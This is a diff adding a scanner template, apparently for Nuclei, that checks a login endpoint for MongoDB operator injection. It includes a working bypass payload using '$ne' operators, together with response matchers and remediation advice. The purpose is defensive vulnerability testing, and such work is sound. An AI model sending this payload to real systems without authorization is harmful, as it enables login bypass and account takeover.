@@ -1,0 +1,23 @@
+id: nosql-injection
+info:
+  name: NoSQL Operator Injection (MongoDB)
+  severity: critical
+  tags: [nosql, injection, mongodb]
+  description: "Injecting MongoDB comparison operators ($ne, $gt) into the authentication query produced a successful login response, indicating the application builds queries from unsanitized user input."
+  remediation: "Validate and reject query operator keys in all user-supplied JSON/form input. Use a schema validation library (e.g. Joi, Zod) that rejects unexpected key patterns. Avoid constructing MongoDB queries from raw user objects."
+  cwe: "CWE-943"
+  owasp: "A03:2021-Injection"
+
+requests:
+  - method: POST
+    path: /api/login
+    headers:
+      Content-Type: application/json
+    body: '{"username":{"$ne":null},"password":{"$ne":null}}'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words: ["token", "authenticated", "success", "welcome", "\"id\""]
+        condition: or
